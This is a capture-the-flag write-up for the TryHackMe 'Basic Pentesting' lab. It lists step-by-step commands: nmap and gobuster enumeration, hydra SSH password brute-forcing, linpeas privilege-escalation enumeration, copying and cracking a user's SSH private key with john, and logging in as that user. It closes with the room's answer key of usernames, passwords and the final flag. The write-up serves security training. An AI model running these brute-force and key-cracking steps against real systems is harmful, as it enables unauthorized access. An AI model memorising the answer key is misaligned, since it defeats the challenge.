# Pasic Pentesting(https://tryhackme.com/room/basicpentestingjt)

target_ip : 10.10.85.182

## Experiments :

1.  found open ports with `sudo nmap -A -Pn -T4 <ip>` : `22,80,139,445,8009,8080`
    
    ```
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
    |   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
    |_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
    80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
    | ajp-methods: 
    |_  Supported methods: GET HEAD POST OPTIONS
    8080/tcp open  http        Apache Tomcat 9.0.7
    |_http-favicon: Apache Tomcat
    |_http-title: Apache Tomcat/9.0.7

    ```

2.  found dir using gobuster : ip:80/development
    `sudo gobuster dir -u http://<ip>:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.txt`
    
3.  scanned with `enum4linux -a <ip>` and found two users "jan" and "kay" for Samba Server 4.3.11-Ubuntu(running on port `445`)

4.  bruteforcing password with hydra on SSH and found password for jan:`armando`
    `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.85.182`

5.  bruteforcing password with hydra on SSH and found no password for kay
    `hydra -l kay -P /usr/share/wordlists/rockyou.txt ssh://10.10.85.182`
    
6.  copied (scp) linpeas.sh(https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh) to target in `/dev/shm` ran it for privrlrdge escalation

7.  found `id_rsa` (private key) for `kay` and copied it.

6. `id_rsa` was passphrase protected so use `john` to crack it
    
    ```
    ~/john/run/ssh2john.py kay_id_rsa > john-kay_id_rsa 
    
    john john-kay_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt | tee kay_john
    
    ```

    found passphrase `beeswax` 

8.  ssh to kay@<ip>

10. found pass.bak in kay's home directory which is the last bit we need to complete the room. [cat and paste]


## Challenges Ans

1.  Deploy the machine and connect to our network [openvpn]

2.  Find the services exposed by the machine [nmap]

3.  What is the name of the hidden directory on the web server(enter name without /)? [gobuster]
    
    ```
    /development (Status: 301)
    /server-status (Status: 403)

    ```
4. User brute-forcing to find the username & password [enum4linux-usernames, hydra-passwd]

5.  What is the username? - jan

6.  What is the password? - armando

7.  What service do you use to access the server(answer in abbreviation in all caps)? - SSH

8.  Enumerate the machine to find any vectors for privilege escalation. [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

9.  What is the name of the other user you found(all lower case)? - kay

10. If you have found another user, what can you do with this information?

11. What is the final password you obtain? - heresareallystrongpasswordthatfollowsthepasswordpolicy$$
